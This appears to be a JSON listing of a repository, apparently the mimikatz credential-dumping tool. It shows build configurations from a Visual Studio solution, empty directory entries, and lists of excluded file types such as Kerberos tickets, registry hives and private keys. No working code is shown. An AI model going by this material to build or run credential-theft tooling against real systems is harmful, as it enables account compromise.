= Release|Win32\r\n\t\t{0BD5DE6B-8DA5-4CF1-AE53-A265010F52AA}.Release|x64.ActiveCfg = Release|x64\r\n\t\t{0BD5DE6B-8DA5-4CF1-AE53-A265010F52AA}.Release|x64.Build.0 = Release|x64\r\n\t\t{0BD5DE6B-8DA5-4CF1-AE53-A265010F52AA}.Second_Release_PowerShell|ARM64.ActiveCfg = Release|Win32\r\n\t\t{0BD5DE6B-8DA5-4CF1-AE53-A265010F52AA}.Second_Release_PowerShell|Win32.ActiveCfg = Release|Win32\r\n\t\t{0BD5DE6B-8DA5-4CF1-AE53-A265010F52AA}.Second_Release_PowerShell|Win32.Build.0 = Release|Win32\r\n\t\t{0BD5DE6B-8DA5-4CF1-AE53-A265010F52AA}.Second_Release_PowerShell|x64.ActiveCfg = Release|Win32\r\n\t\t{0BD5DE6B-8DA5-4CF1-AE53-A265010F52AA}.Simple_DLL|ARM64.ActiveCfg = Release|Win32\r\n\t\t{0BD5DE6B-8DA5-4CF1-AE53-A265010F52AA}.Simple_DLL|Win32.ActiveCfg = Release|Win32\r\n\t\t{0BD5DE6B-8DA5-4CF1-AE53-A265010F52AA}.Simple_DLL|Win32.Build.0 = Release|Win32\r\n\t\t{0BD5DE6B-8DA5-4CF1-AE53-A265010F52AA}.Simple_DLL|x64.ActiveCfg = Release|Win32\r\n\tEndGlobalSection\r\n\tGlobalSection(SolutionProperties) = preSolution\r\n\t\tHideSolutionNode = FALSE\r\n\tEndGlobalSection\r\n\tGlobalSection(NestedProjects) = preSolution\r\n\t\t{282B4B77-BFF6-4DCA-9A60-6F4036929AEE} = {1ADABD33-DEBE-4095-8EAE-9B6ED51DB68E}\r\n\t\t{294B51F3-90EF-4F0A-BB04-20321A513A4F} = {1ADABD33-DEBE-4095-8EAE-9B6ED51DB68E}\r\n\t\t{96078881-DEC1-4EF5-A24A-A81AC007809D} = {294B51F3-90EF-4F0A-BB04-20321A513A4F}\r\n\t\t{E9D1619F-D4A1-4AFA-B261-B01091EB8D56} = {294B51F3-90EF-4F0A-BB04-20321A513A4F}\r\n\t\t{2FC87C8A-79C0-407D-A022-A13E793C2BC1} = {294B51F3-90EF-4F0A-BB04-20321A513A4F}\r\n\tEndGlobalSection\r\nEndGlobal\r\n"
        },
        {
          "name": "mimikatz",
          "type": "tree",
          "content": null
        },
        {
          "name": "mimilib",
          "type": "tree",
          "content": null
        },
        {
          "name": "mimilove",
          "type": "tree",
          "content": null
        },
        {
          "name": "mimispool",
          "type": "tree",
          "content": null
        },
        {
          "name": "modules",
          "type": "tree",
          "content": null
        },
        {
          "name": "notrunk.lst",
          "type": "blob",
          "size": 0.095703125,
          "content": "*.obj\r\n*.lib\r\n*.exp\r\n*.kirbi\r\n*.log\r\n*.hiv\r\n*.key\r\n*.reg\r\n*.pfx\r\n*.cer\r\n*.pvk\r\n*.ndr\r\n*.der\r\n*.dmp"
        },
        {
          "name": "trunk.lst",
          "type": "blob",
          "size": 0.056640625,
          "content": ".\\Win32\r\n.\\x64\r\nREADME.md\r\nkiwi_passwords.yar\r\nmimicom.idl"
        }
      ]
    }
  ]
}